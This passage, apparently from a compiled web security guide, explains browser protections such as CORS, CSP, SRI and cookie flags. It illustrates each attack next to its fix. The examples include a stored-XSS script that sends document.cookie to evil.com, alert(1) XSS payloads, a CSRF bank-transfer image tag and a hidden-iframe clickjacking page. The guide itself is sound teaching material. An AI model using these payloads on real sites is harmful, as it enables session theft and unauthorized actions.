Depth"}),"\n",(0,r.jsx)(n.p,{children:"Multiple layers of security controls:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502   Perimeter Security (WAF)      \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502   Network Security (Firewall)   \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502   Application Security          \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502   Data Security (Encryption)    \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502   Physical Security             \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n"})}),"\n",(0,r.jsx)(n.h3,{id:"principle-of-least-privilege",children:"Principle of Least Privilege"}),"\n",(0,r.jsx)(n.p,{children:"Grant minimum access necessary:"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"Users get only required permissions"}),"\n",(0,r.jsx)(n.li,{children:"Time-limited access tokens"}),"\n",(0,r.jsx)(n.li,{children:"Separation of duties"}),"\n",(0,r.jsx)(n.li,{children:"Regular permission audits"}),"\n"]}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"3-browser--frontend-security",children:"3. Browser & Frontend Security"}),"\n",(0,r.jsx)(n.h3,{id:"same-origin-policy-sop",children:"Same-Origin Policy (SOP)"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"What It Is:"}),"\nThe cornerstone of web security. Prevents scripts from one origin from accessing data from another origin."]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Origin Definition:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"Origin = Protocol + Domain + Port\n\n\u2705 Same Origin:\nhttps://example.com:443/page1\nhttps://example.com:443/page2\n\n\u274c Different Origin:\nhttps://example.com      vs  http://example.com (protocol)\nhttps://example.com      vs  https://api.example.com (subdomain)\nhttps://example.com:443  vs  https://example.com:8080 (port)\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"What SOP Protects:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"DOM access"}),"\n",(0,r.jsx)(n.li,{children:"Cookie access"}),"\n",(0,r.jsx)(n.li,{children:"AJAX requests"}),"\n",(0,r.jsx)(n.li,{children:"LocalStorage/SessionStorage"}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Best Practices:"}),"\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Rely on SOP as foundational protection\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," CORS for controlled cross-origin access\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," Disabling SOP (never do this)\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," Using JSONP (outdated and insecure)"]}),"\n",(0,r.jsx)(n.h3,{id:"cross-origin-resource-sharing-cors",children:"Cross-Origin Resource Sharing (CORS)"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"What It Is:"}),"\nMechanism to relax Same-Origin Policy in a controlled manner."]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"How It Works:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-http",children:"# Browser sends preflight request\nOPTIONS /api/data HTTP/1.1\nOrigin: https://frontend.com\nAccess-Control-Request-Method: POST\n\n# Server responds\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://frontend.com\nAccess-Control-Allow-Methods: POST, GET\nAccess-Control-Allow-Credentials: true\nAccess-Control-Max-Age: 3600\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Configuration Examples:"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Express.js:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"const cors = require('cors');\n\n// \u274c INSECURE - Never do this in production\napp.use(cors({\n  origin: '*',\n  credentials: true\n}));\n\n// \u2705 SECURE - Whitelist specific origins\napp.use(cors({\n  origin: ['https://app.example.com', 'https://admin.example.com'],\n  credentials: true,\n  methods: ['GET', 'POST', 'PUT', 'DELETE'],\n  allowedHeaders: ['Content-Type', 'Authorization'],\n  maxAge: 86400\n}));\n\n// \u2705 SECURE - Dynamic validation\napp.use(cors({\n  origin: function (origin, callback) {\n    const allowedOrigins = process.env.ALLOWED_ORIGINS.split(',');\n    if (!origin || allowedOrigins.includes(origin)) {\n      callback(null, true);\n    } else {\n      callback(new Error('Not allowed by CORS'));\n    }\n  },\n  credentials: true\n}));\n"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Best Practices:"}),"\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Specific origin whitelist\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Credentials only with trusted origins\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Appropriate methods and headers\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," ",(0,r.jsx)(n.code,{children:"Access-Control-Allow-Origin: *"})," with credentials\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," Reflecting origin header without validation\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," Overly permissive configurations"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Common Mistakes:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// \u274c DANGEROUS - Reflects any origin with credentials\napp.use((req, res, next) => {\n  res.header('Access-Control-Allow-Origin', req.headers.origin);\n  res.header('Access-Control-Allow-Credentials', 'true');\n  next();\n});\n\n// \u2705 SAFE - Validates before reflecting\nconst allowedOrigins = ['https://app.example.com'];\napp.use((req, res, next) => {\n  const origin = req.headers.origin;\n  if (allowedOrigins.includes(origin)) {\n    res.header('Access-Control-Allow-Origin', origin);\n    res.header('Access-Control-Allow-Credentials', 'true');\n  }\n  next();\n});\n"})}),"\n",(0,r.jsx)(n.h3,{id:"cross-site-scripting-xss",children:"Cross-Site Scripting (XSS)"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"What It Is:"}),"\nInjecting malicious scripts into trusted websites that execute in victims' browsers."]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Types of XSS:"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"1. Stored XSS (Most Dangerous)"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Attacker submits comment:\n<script>\n  fetch('https://evil.com/steal?cookie=' + document.cookie);\n<\/script>\n\n// Stored in database, executed for all users viewing the comment\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"2. Reflected XSS"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// URL: https://example.com/search?q=<script>alert(1)<\/script>\n\n// Server reflects input:\n<div>Search results for: <script>alert(1)<\/script></div>\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"3. DOM-Based XSS"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// URL: https://example.com/#<img src=x onerror=alert(1)>\n\n// Vulnerable JavaScript:\ndocument.body.innerHTML = location.hash.slice(1);\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Prevention Strategies:"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"1. Output Encoding:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:'// \u274c VULNERABLE\nfunction displayName(name) {\n  document.getElementById(\'output\').innerHTML = name;\n}\n\n// \u2705 SAFE - Use textContent\nfunction displayName(name) {\n  document.getElementById(\'output\').textContent = name;\n}\n\n// \u2705 SAFE - HTML encode\nfunction escapeHtml(unsafe) {\n  return unsafe\n    .replace(/&/g, "&amp;")\n    .replace(/</g, "&lt;")\n    .replace(/>/g, "&gt;")\n    .replace(/"/g, "&quot;")\n    .replace(/\'/g, "&#039;");\n}\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"2. React (Automatic Escaping):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-jsx",children:"// \u2705 SAFE - Automatic escaping\nfunction UserGreeting({ username }) {\n  return <div>Hello, {username}</div>;\n}\n\n// \u274c DANGEROUS - Bypasses escaping\nfunction UnsafeComponent({ html }) {\n  return <div dangerouslySetInnerHTML={{ __html: html }} />;\n}\n\n// \u2705 SAFE - Sanitize first\nimport DOMPurify from 'dompurify';\n\nfunction SafeComponent({ html }) {\n  const clean = DOMPurify.sanitize(html);\n  return <div dangerouslySetInnerHTML={{ __html: clean }} />;\n}\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"3. Content Security Policy:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-http",children:"Content-Security-Policy:\n  default-src 'self';\n  script-src 'self' 'nonce-2726c7f26c';\n  style-src 'self' 'unsafe-inline';\n  img-src 'self' https://cdn.example.com;\n  object-src 'none';\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"4. Input Validation:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Server-side validation\nconst validateUsername = (username) => {\n  const regex = /^[a-zA-Z0-9_-]{3,20}$/;\n  if (!regex.test(username)) {\n    throw new Error('Invalid username format');\n  }\n  return username;\n};\n\n// Sanitization library\nconst sanitizeHtml = require('sanitize-html');\n\nconst clean = sanitizeHtml(dirtyHtml, {\n  allowedTags: ['b', 'i', 'em', 'strong', 'a', 'p'],\n  allowedAttributes: {\n    'a': ['href']\n  },\n  allowedSchemes: ['http', 'https', 'mailto']\n});\n"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Best Practices:"}),"\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Framework's built-in escaping (React, Vue, Angular)\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," DOMPurify for HTML sanitization\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Content Security Policy\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," HTTPOnly cookies for sensitive data\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," innerHTML with user input\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," eval() with untrusted data\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," document.write()\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," Disabling framework protections"]}),"\n",(0,r.jsx)(n.h3,{id:"cross-site-request-forgery-csrf",children:"Cross-Site Request Forgery (CSRF)"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"What It Is:"}),"\nForcing authenticated users to perform unwanted actions."]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Attack Example:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-html",children:'\x3c!-- Attacker\'s malicious website --\x3e\n<img src="https://bank.com/transfer?to=attacker&amount=1000">\n\n\x3c!-- User is logged into bank.com, browser automatically sends cookies --\x3e\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Prevention Strategies:"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"1. CSRF Tokens (Synchronizer Token Pattern):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Express middleware\nconst csrf = require('csurf');\nconst csrfProtection = csrf({ cookie: true });\n\napp.get('/form', csrfProtection, (req, res) => {\n  res.render('form', { csrfToken: req.csrfToken() });\n});\n\napp.post('/submit', csrfProtection, (req, res) => {\n  // Token validated automatically\n  res.send('Success');\n});\n"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-html",children:'\x3c!-- HTML form --\x3e\n<form method="POST" action="/submit">\n  <input type="hidden" name="_csrf" value="{{csrfToken}}">\n  <button type="submit">Submit</button>\n</form>\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"2. SameSite Cookies:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Set cookies with SameSite attribute\nres.cookie('sessionId', sessionId, {\n  httpOnly: true,\n  secure: true,\n  sameSite: 'strict', // or 'lax'\n  maxAge: 3600000\n});\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"SameSite Values:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"Strict"}),": Cookie sent only for same-site requests"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"Lax"}),": Cookie sent for top-level navigation (default in modern browsers)"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"None"}),": Cookie sent for all requests (requires ",(0,r.jsx)(n.code,{children:"Secure"}),")"]}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"3. Double Submit Cookie:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Set CSRF token in cookie AND require it in request\napp.use((req, res, next) => {\n  const token = generateToken();\n  res.cookie('csrf-token', token, { sameSite: 'strict' });\n  req.csrfToken = token;\n  next();\n});\n\n// Validate token\napp.post('/api/*', (req, res, next) => {\n  const cookieToken = req.cookies['csrf-token'];\n  const headerToken = req.headers['x-csrf-token'];\n\n  if (!cookieToken || cookieToken !== headerToken) {\n    return res.status(403).json({ error: 'Invalid CSRF token' });\n  }\n  next();\n});\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"4. Custom Request Headers:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Frontend - Add custom header\nfetch('/api/data', {\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/json',\n    'X-Requested-With': 'XMLHttpRequest' // CSRF mitigation\n  },\n  credentials: 'include',\n  body: JSON.stringify(data)\n});\n\n// Backend - Verify header presence\napp.post('/api/*', (req, res, next) => {\n  if (!req.headers['x-requested-with']) {\n    return res.status(403).json({ error: 'Missing required header' });\n  }\n  next();\n});\n"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Best Practices:"}),"\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," SameSite=Lax or Strict for session cookies\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," CSRF tokens for state-changing operations\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Custom headers for API requests\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," GET for read-only operations\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," GET requests for state changes\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," Relying solely on cookies for authentication\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," CORS misconfiguration that allows credential sharing"]}),"\n",(0,r.jsx)(n.h3,{id:"clickjacking",children:"Clickjacking"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"What It Is:"}),"\nTricking users into clicking on something different from what they perceive."]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Attack Example:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-html",children:'\x3c!-- Attacker\'s website --\x3e\n<iframe\n  src="https://bank.com/transfer"\n  style="opacity: 0; position: absolute; top: 0; left: 0;">\n</iframe>\n\n<button style="position: absolute; top: 100px; left: 100px;">\n  Click for free prize!\n</button>\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Prevention:"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"1. X-Frame-Options Header:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-http",children:"X-Frame-Options: DENY\n# or\nX-Frame-Options: SAMEORIGIN\n"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Express\napp.use((req, res, next) => {\n  res.setHeader('X-Frame-Options', 'DENY');\n  next();\n});\n\n// Helmet.js\nconst helmet = require('helmet');\napp.use(helmet.frameguard({ action: 'deny' }));\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"2. Content-Security-Policy:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-http",children:"Content-Security-Policy: frame-ancestors 'none';\n# or\nContent-Security-Policy: frame-ancestors 'self' https://trusted.com;\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"3. JavaScript Frame-Busting (Legacy):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Not recommended as primary defense\nif (top !== self) {\n  top.location = self.location;\n}\n"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Best Practices:"}),"\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," CSP frame-ancestors (modern approach)\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," X-Frame-Options as fallback\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Both headers for maximum compatibility\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," Relying only on JavaScript frame-busting\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," Allowing your site to be framed unnecessarily"]}),"\n",(0,r.jsx)(n.h3,{id:"content-security-policy-csp",children:"Content Security Policy (CSP)"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"What It Is:"}),"\nHTTP header that controls resources the browser is allowed to load."]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Basic CSP:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-http",children:"Content-Security-Policy: default-src 'self'\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Comprehensive CSP Example:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-http",children:"Content-Security-Policy:\n  default-src 'self';\n  script-src 'self' 'nonce-{random}' https://trusted-cdn.com;\n  style-src 'self' 'unsafe-inline';\n  img-src 'self' data: https://images.example.com;\n  font-src 'self' https://fonts.gstatic.com;\n  connect-src 'self' https://api.example.com;\n  frame-ancestors 'none';\n  base-uri 'self';\n  form-action 'self';\n  upgrade-insecure-requests;\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Directive Breakdown:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Express implementation\napp.use((req, res, next) => {\n  const nonce = generateNonce();\n  res.locals.nonce = nonce;\n\n  res.setHeader('Content-Security-Policy', `\n    default-src 'self';\n    script-src 'self' 'nonce-${nonce}';\n    style-src 'self' 'unsafe-inline';\n    img-src 'self' https: data:;\n    font-src 'self' https://fonts.gstatic.com;\n    connect-src 'self' https://api.example.com;\n    object-src 'none';\n    base-uri 'self';\n    form-action 'self';\n    frame-ancestors 'none';\n    upgrade-insecure-requests;\n  `.replace(/\\s+/g, ' ').trim());\n\n  next();\n});\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Using Nonces:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-html",children:"\x3c!-- Server-side template --\x3e\n<script nonce=\"{{nonce}}\">\n  // This will execute\n  console.log('Allowed script');\n<\/script>\n\n<script>\n  // This will be blocked (no nonce)\n  console.log('Blocked script');\n<\/script>\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"CSP Reporting:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-http",children:"Content-Security-Policy-Report-Only:\n  default-src 'self';\n  report-uri /csp-violation-report;\n"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Collect CSP violations\napp.post('/csp-violation-report', express.json({ type: 'application/csp-report' }), (req, res) => {\n  console.log('CSP Violation:', req.body);\n  // Log to monitoring service\n  res.status(204).end();\n});\n"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Best Practices:"}),"\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Start with Report-Only mode\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Nonces for inline scripts\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," 'strict-dynamic' for modern browsers\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," upgrade-insecure-requests\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," 'unsafe-inline' and 'unsafe-eval'\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," Overly permissive policies\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," Wildcard sources (*)"]}),"\n",(0,r.jsx)(n.h3,{id:"subresource-integrity-sri",children:"Subresource Integrity (SRI)"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"What It Is:"}),"\nEnsures that files fetched from CDNs haven't been tampered with."]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Implementation:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-html",children:'\x3c!-- With SRI --\x3e\n<script\n  src="https://cdn.example.com/library.js"\n  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"\n  crossorigin="anonymous">\n<\/script>\n\n<link\n  rel="stylesheet"\n  href="https://cdn.example.com/style.css"\n  integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u"\n  crossorigin="anonymous">\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Generating SRI Hashes:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Using openssl\ncurl -s https://cdn.example.com/library.js | openssl dgst -sha384 -binary | openssl base64 -A\n\n# Using Node.js\nconst crypto = require('crypto');\nconst fs = require('fs');\n\nconst file = fs.readFileSync('library.js');\nconst hash = crypto.createHash('sha384').update(file).digest('base64');\nconsole.log(`sha384-${hash}`);\n"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Best Practices:"}),"\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," SRI for all third-party scripts and styles\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," SHA-384 or SHA-512 algorithms\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," crossorigin attribute with SRI\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Multiple hashes for fallback\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," Using SRI without crossorigin\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," Weak hash algorithms (MD5, SHA-1)"]}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"4-cookie-security",children:"4. Cookie Security"}),"\n",(0,r.jsx)(n.h3,{id:"cookie-flags-explained",children:"Cookie Flags Explained"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Complete Cookie Example:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"Set-Cookie: sessionId=abc123;\n  Secure;\n  HttpOnly;\n  SameSite=Strict;\n  Domain=example.com;\n  Path=/;\n  Max-Age=3600;\n  Expires=Wed, 21 Oct 2025 07:28:00 GMT\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Flag Breakdown:"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"1. Secure"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// \u2705 HTTPS only - prevents MITM attacks\nres.cookie('token', value, { secure: true });\n"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"Cookie sent only over HTTPS"}),"\n",(0,r.jsx)(n.li,{children:"Prevents interception on unsecured connections"}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.strong,{children:"Always use in production"})}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"2. HttpOnly"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// \u2705 No JavaScript access - prevents XSS cookie theft\nres.cookie('sessionId', value, { httpOnly: true });\n"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:["Cannot be accessed via ",(0,r.jsx)(n.code,{children:"document.cookie"})]}),"\n",(0,r.jsx)(n.li,{children:"Protects against XSS attacks"}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.strong,{children:"Use for authentication tokens"})}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"3. SameSite"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Strict - Maximum CSRF protection\nres.cookie('auth', value, { sameSite: 'strict' });\n\n// Lax - Balance of security and usability (default)\nres.cookie('session', value, { sameSite: 'lax' });\n\n// None - Required for cross-site cookies (needs Secure)\nres.cookie('tracking', value, { sameSite: 'none', secure: true });\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"SameSite Comparison:"})}),"\n",(0,r.jsxs)(n.table,{children:[(0,r.jsx)(n.thead,{children:(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.th,{children:"SameSite Value"}),(0,r.jsx)(n.th,{children:"Cross-site GET"}),(0,r.jsx)(n.th,{children:"Cross-site POST"}),(0,r.jsx)(n.th,{children:"Use Case"})]})}),(0,r.jsxs)(n.tbody,{children:[(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"Strict"}),(0,r.jsx)(n.td,{children:"\u274c"}),(0,r.jsx)(n.td,{children:"\u274c"}),(0,r.jsx)(n.td,{children:"Auth cookies"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"Lax (default)"}),(0,r.jsx)(n.td,{children:"\u2705 (top-level)"}),(0,r.jsx)(n.td,{children:"\u274c"}),(0,r.jsx)(n.td,{children:"Session cookies"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"None"}),(0,r.jsx)(n.td,{children:"\u2705"}),(0,r.jsx)(n.td,{children:"\u2705"}),(0,r.jsx)(n.td,{children:"Third-party cookies"})]})]})]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"4. Domain & Path"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Scope cookie to specific domain/subdomain\nres.cookie('data', value, {\n  domain: '.example.com', // Available to all subdomains\n  path: '/api' // Only sent to /api routes\n});\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"5. 